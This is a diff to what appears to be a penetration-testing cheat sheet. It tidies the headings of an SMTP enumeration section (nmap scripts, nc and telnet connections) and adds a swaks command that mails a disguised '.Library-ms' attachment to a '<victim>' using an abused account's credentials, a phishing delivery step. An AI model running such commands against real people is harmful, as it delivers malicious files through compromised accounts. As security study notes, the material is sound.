@@ -920,17 +920,17 @@ rpcclient 10.10.0.1 -U sec504
 
 ## SMTP Enumeration
 
-### nmap enumeration:
+### nmap enumeration
 ```bash
 sudo nmap -p 25 --script=smtp-enum* <target DOMAIN/ip>
 ```
 
-### Connect through nc:
+### Connect through nc
 ```bash
 nc -nv <IP> 25
 ```
 
-### Connect through telnet - Windows:
+### Connect through telnet - Windows
 ```powershell
 telnet <IP>
 ```
@@ -953,6 +953,13 @@ telnet <IP>
 | SEND FROM : \<reverse-path> | Send mail to the terminal.                                               | Seldom used        |
 | SOML FROM : \<reverse-path> | Send mail to the terminal if possible; otherwise to mailbox.             | Seldom used        |
 | SAML FROM : \<reverse-path> | Send mail to the terminal and mailbox.                                   | Seldom used        |
+
+### swaks
+- Swiss Army Knife for SMTP
+
+```bash
+swaks --to <victim> --from <abused email> --server <victim machine> --auth-user <abused user> -auth-password <abused pw> --attach <path to attachment ie: /home/kali/webdav/config.Library-ms> --header "test" --body "config file for software"
+```
 
 
 ## SNMP
